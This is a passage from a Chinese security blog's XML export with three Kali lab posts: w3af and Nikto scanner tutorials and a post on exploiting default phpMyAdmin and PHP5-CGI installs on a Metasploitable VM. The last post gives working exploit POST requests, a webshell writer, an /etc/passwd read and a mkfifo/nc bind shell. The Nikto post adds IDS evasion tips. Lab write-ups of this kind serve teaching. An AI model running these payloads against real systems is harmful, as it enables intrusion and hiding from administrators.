#列出audit插件类中的小插件 也可以在图形界面化直观的看清其结构 1234567891011#使用audit模块中的xss脚本攻击,sql注入,本地文件调用这三个插件,可以选用一个,也可以选用多个#那么再次列出时这些插件的Status将会变成Enabled,如果进行扫描,那么就会针对这些漏洞去扫描w3af/plugins&gt;&gt;&gt; audit xss sqli lfi #使用audit模块中的所有插件进行扫描w3af/plugins&gt;&gt;&gt; audit all#输入crawl模块,按两次tab键,可以显示该模块下的插件w3af/plugins&gt;&gt;&gt; crawl genexus_xml wordpress_fingerprint dot_listing content_negotiation robots_txt archive_dot_org ria_enumerator wordnet user_dir sitemap_xml bing_spider dir_file_bruter phpinfo find_dvcs import_results urllist_txt google_spider url_fuzzer find_backdoors web_spider spider_man find_captchas oracle_discovery wsdl_finder wordpress_enumerate_users web_diff dwsync_xml pykto wordpress_fullpathdisclosure phishtank digit_sum open_api dot_ds_store ghdb all config desc w3af/plugins&gt;&gt;&gt; crawl web_spider #选择该模块下的web爬虫模块 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485w3af&gt;&gt;&gt; profiles #进入profiles模块,这个模块用于自定义组合插件,当然w3af自定义了一些组合插件w3af/profiles&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| use | Use a profile. || list | List available profiles. || save_as | Save the current configuration to a profile. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||------------------------------------------------------------------------------w3af/profiles&gt;&gt;&gt; list #列出在profiles模块下的插件w3af/profiles&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| use | Use a profile. || list | List available profiles. || save_as | Save the current configuration to a profile. #保存当前配置到一个文件内 ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------|w3af/profiles&gt;&gt;&gt; save_as test #使用save_as后面自定义一个文件名,表示将刚刚的配置存放在test文件内Profile saved.#使用下列命令将test文件独立出来,以便供其他人使用w3af/profiles&gt;&gt;&gt; save_as test self-containedw3af/profiles&gt;&gt;&gt; use test #使用自定义的test文件中的配置进行扫描The plugins configured by the scan profile have been enabled, and their options configured.Please set the target URL(s) and start the scan.w3af/profiles&gt;&gt;&gt; back #返回上一级w3af&gt;&gt;&gt; http-settings #进入http-settings,设置全局参数w3af/config:http-settings&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. #设置参数值 || save | Save the configured settings. #保存配置 ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. #返回上一目录 || exit | Exit w3af. ||-----------------------------------------------------------------------------------|w3af/config:http-settings&gt;&gt;&gt; view #列出可用的操作和其值|---------------------------------------------------------------------------------#设置随机用户代理浏览器,默认位w3af的代理,容易被管理员查看日志发现w3af/config:http-settings&gt;&gt;&gt; set rand_user_agent True w3af/config:http-settings&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; misc-settings #进入misc-setting全局设置选项中w3af/config:misc-settings&gt;&gt;&gt; view #查看需要配置的参数w3af/config:misc-settings&gt;&gt;&gt; set fuzz_url_filenames True #设置对URL中的文件名进行模糊测试(Fuzz)w3af/config:misc-settings&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; target #进入target模块,设置目标信息w3af/config:target&gt;&gt;&gt; help #查看在此模块下可以使用的命令|-----------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. || save | Save the configured settings. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------w3af/config:target&gt;&gt;&gt; view #列出可用的操作|----------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------|| target_framework | unknown | | Target programming framework || | | | (unknown/php/asp/asp.net/java/jsp/cfm/ruby/perl) || target | | | A comma separated list of URLs || target_os | unknown | | Target operating system (unknown/unix/windows) ||-----------------------------------------------------------------------------#设置目标URLw3af/config:target&gt;&gt;&gt; set target http://192.168.128.129w3af/config:target&gt;&gt;&gt; set target_os unix #设置目标系统为unixw3af/config:target&gt;&gt;&gt; back #返回上一级目录w3af&gt;&gt;&gt;start #开始扫描 也可以使用w3af中集成的脚本去进行扫描1234567891011121314151617181920212223242526272829root@kali:~/w3af-master# cd scripts/root@kali:~/w3af-master/scripts# lsallowed_methods.w3af login_brute_form_GET.w3afall.w3af login_brute_password_only.w3afauth_detailed.w3af mangle_request.w3afbing_spider.w3af mangle_response.w3afblind_sqli_detection.w3af os_commanding-lnx-vdaemon.w3afcookie_fuzzing.w3af os_commanding-lnx-w3afAgent.w3afcross_domain.w3af os_commanding_shell.w3afcsrf.w3af os_commanding.w3afdav_shell.w3af php_sca-payload.w3afdetect_transparent_proxy.w3af profile-fast_scan.w3afdigit_sum.w3af remote_file_include_local_ws.w3afdvwa.w3af remote_file_include_proxy.w3afeval_shell.w3af remote_file_include_shell.w3afeval.w3af remote_file_include_shell-xss.w3afexploit_all.w3af remote_file_include_w3af_site.w3afexploit_fast.w3af spider_man.w3affilename_xss.w3af sqli.w3affile_upload_shell.w3af sqlmap_exploit_int.w3affrontpage_version.w3af targets_from_file.w3afheader_fuzzing.w3af web_spider-ignore_regex.w3afhtml_output.w3af web_spider-only_forward.w3aflist_all_plugins.w3af web_spider.w3aflocal_file_include-payload.w3af xss_simple.w3aflocal_file_include.w3af xss_stored.w3af#参数-s表示指定具体的脚本去进行扫描,但需要首先去进入该脚本进行配置目标信息,然后调用w3af的console接口去扫描是否存在sql注入root@kali:~/w3af-master# ./w3af_console -s scripts/sqli.w3af]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB扫描工具之Nikto实践]]></title>
    <url>%2F2018%2F10%2F23%2FWEB%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B9%8BNikto%E5%AE%9E%E8%B7%B5-1%2F</url>
    <content type="text"><![CDATA[实验环境:kali:192.168.136.128/24 Metasploitable:192.168.136.129/24 Nikto简介Web扫描工具大部分都支持两种扫描模式:代理截断模式和主动扫描模式Nikto:是一个Web服务器扫描程序，主要是去检查软件版本信息,搜索存在的安全隐患的文件,服务器配置漏洞,Web Application层面的安全隐患等,也能避免404误判（原因：很多服务器不遵循RFC标准，对于不存在的对象返回200响应码）；依据响应文件内容判断，不同扩展名的文件404响应内容不同；去时间信息后的内容取MD5值；不建议用-no404参数（-no404参数指去不校验404误判,它还可以捕获并打印收到的任何cookie. Wiki百科对其功能的介绍 Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/CGIs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.Nikto是一个开源（GPL）Web服务器扫描程序，可针对多个项目对Web服务器执行全面测试，包括超过6700个潜在危险文件/ CGI，检查超过1250台服务器的过期版本，以及超过270台服务器上的版本特定问题。它还会检查服务器配置项，例如是否存在多个索引文件，HTTP服务器选项，并将尝试识别已安装的Web服务器和软件。扫描项目和插件经常更新，可以自动更新。 开始操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576root@kali:~# nikto -update #从CIRT.net网站更新nikto的数据库和插件root@kali:~# nikto -list-plugins #列出nikto内列出所有可用的插件#扫描目标主机的Web层面的漏洞,格式为:nikto -host 目标服务器URL(可以是多个URL)root@kali:~# nikto -host http://192.168.136.129 #也可以使用nikto -host 目标IP地址 -port 扫描端口,和上一条命令效果一致root@kali:~# nikto -host 192.168.136.129 -port 80,443 #使用ssl模式去扫描目标系统的信息root@kali:~# nikto -host www.baidu.com -port 443 -ssl #扫描多个目标,将目标地址存放在某个文本文档中,#目标地址格式为:http://主机名:端口或者IP地址:端口或者直接是IP地址root@kali:~# nikto -host host.txt #使用nmap扫描目标网段的80端口,将开放80端口的主机IP筛选出后传送给nikto进行扫描web服务漏洞,#参数-oG表示输出便于通过bash或者perl处理的格式,非xmlroot@kali:~# nmap -p80 192.168.136.129/24 -oG - | nikto -host - #nikto支持代理功能root@kali:~# nikto -host 192.168.1.1 -useproxy http://localhost:8087Nikto互动功能:Nikto包含几个可在活动扫描期间更改的选项，前提是它在提供POSIX支持的系统上运行，其中包括unix和其他一些操作系统。在没有POSIX支持的系统上，将以静默方式禁用这些功能。在主动扫描期间，按下面任何一个键将打开或关闭列出的功能或执行列出的操作。请注意，这些区分大小写。 SPACE - 报告当前扫描状态 v - 打开/关闭详细模式 d - 打开/关闭调试模式,极其详细信息 e - 打开/关闭错误报告 p - 打开/关闭进度报告 r - 打开/关闭重定向显示 c - 打开/关闭cookie显示 o - 打开/关闭OK显示 a - 打开/关闭验证显示 q - 退出 N - 下一个主持人 P - 暂停,大写Pcookie简介[cookie wiki](https://zh.wikipedia.org/wiki/Cookie)因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。修改nikto的配置文件,写入cookie信息,即可扫描那些需要身份认证才可以访问的页面root@kali:~# vim /etc/nikto.conf #编辑其配置文件修改USERAGENT,防止扫描的时候被系统管理员发现(我目前设置为win10的浏览器)USERAGENT=Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko (Evasions:@EVASIONS) (Test:@TESTID)设置用户代理的方法:使用火狐浏览器登陆[User-Agent Switcher](https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher-revived/?src=search),添加到Firefox,在右上角打开图标! 123456789101112131415161718192021在STATIC-COOKIE这个命令下取消注释,输入cookie信息,格式为&quot;cookie name1&quot;=&quot;value&quot;;&quot;cookie name2&quot;=&quot;value&quot;(可以设置多个cookie) STATIC-COOKIE=&quot;PHPSESSION&quot;=&quot;9eb59920d99db2871254303ec47b3460&quot;;&quot;security&quot;=&quot;high&quot;(这是我的cookie,需要自行抓取cookie信息) 然后保存退出,在终端开始用扫描(cookie扫描),将会获得更有效的扫描结果# nikto加参数-evasion表示使用LibWhisker中对IDS的躲避技术,防止被发现,root@kali:~# nikto -host http://192.168.136.129 可使用以下几种类型: • 1 随机URL编码(非UTF-8方式) • 2 自选择路径(/./) • 3 过早结束的URL • 4 优先考虑长随机字符串• 5 参数欺骗 • 6 使用TAB作为命令的分隔符 • 7 使用变化的URL • 8 使用Windows路径分隔符&quot;\&quot; #使用第一种,第六种,第七种方法,自行搭配root@kali:~# nikto -host http://192.168.136.129 -evasion 167]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘之默认安装漏洞]]></title>
    <url>%2F2018%2F10%2F23%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E4%B9%8B%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E6%BC%8F%E6%B4%9E-1%2F</url>
    <content type="text"><![CDATA[phpMyAdmin默认安装漏洞大家好,欢迎来到我的博客,这是我第一次使用该博客去发表文章,内心激动不已,那么让我们聊聊默认安装带来的安全问题吧. phpMyAdmin是phpMyAdmin团队开发的一套免费的、基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等。 其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器上的后台数据库(MySQL数据库),但如果采用默认安装,敏感路径未做出处理,便会存在安全漏洞,最突出的是其setup脚本中存在着服务器端请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。 以下版本受到影响：phpMyAdmin 4.0.10.19之前的版本，4.4.15.10之前的4.4.x版本，4.6.6之前的4.6.x版本。 如果目标系统采用php语言搭建的环境,那么可以尝试使用一些扫描软件或者手动爬网去试图发现是否存在phpmyadmin目录. 测试环境:kali:192.168.128.128/24Metasploitable:192.168.128.129/24 1,存在phpmyadmin界面:如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件) 我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行 1234567891011121314151617POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1 #问号及其后面的内容用于修改修改php的主配置文件php.ini，从而可以执行下面插入的php代码Host: 192.168.128.128 Content-Length: 35&lt;?php passthru(&apos;id&apos;); #passthru() 函数用于调用系统命令，并把命令的运行结果原样地直接输出到标准输出设备上。 #也可以将id命令换成其他Linux命令去获取web系统的数据,目前使用的是普通用户www-date,权限有限die(); #die() 函数输出一条消息，并退出当前脚本,此处使用为了避免获取多余无用的信息?&gt; 可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果 命令如下: 123456789101112POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1Host: 192.168.128.128 Content-Length: 102&lt;?php passthru(&apos;echo &quot;&lt;?php \$cmd = \$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt;/var/www/2.php&apos;);#该木马表示将GET方式获取的指令赋值于cmd命令,并使用system()函数运行cmd变量存储的命令#反斜杠作用:避免服务器将上传内容过滤,输入命令无效die();?&gt; 通过在浏览器访问该木马,便可获取目标系统的shell 使用kali中的php脚本获取反弹shell 反弹shell:指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，那么我们就可以在本地使用被攻击主机的命令并且不容易被发现 kali中的PHP的反弹shell为:/usr/share/webshells/php/php-reverse-shell.php然后编辑php/php-reverse-shell.php,修改ip地址为本机kali的地址,端口号选1024-65535之内任意(1-1023端口已经被系统服务占用) 使用nc命令在本地(kali主机)监听本地1234端口然后将php-reverse-shell.php的内容粘贴至发送的POST请求中,点击go Ubuntu/Debain默认安装PHP5-CGI漏洞其针对Apache/PHP远程代码执行漏洞攻击该漏洞存在于使用PHP的Apache服务器，在Debian和Ubuntu的服务器上默认安装php5-cgi模块的服务器都存在此漏洞。程序员可以使用CGI模块在PHP代码中调用操作系统的命令如果安装了PHP5-CGI,则会在/usr/lib/cgi-bin下面生成两个二进制文件:php和php5我们发送编码后的参数信息(编码是为了防止服务器过滤信息)去获取目标服务器的shell 1234567891011121314POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1Host: 123Content-Length: 45&lt;?phpecho system(&apos;cat /etc/passwd&apos;);?&gt; 其实将刚刚编码的数据进行解码,可以看到其实就是PHP的参数数据 也可以让服务器主动打开一个端口,然后在本地使用nc去连接代码: 12345678910111213POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1Host: 123Content-Length: 86&lt;?phpecho system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);?&gt;]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
</search>
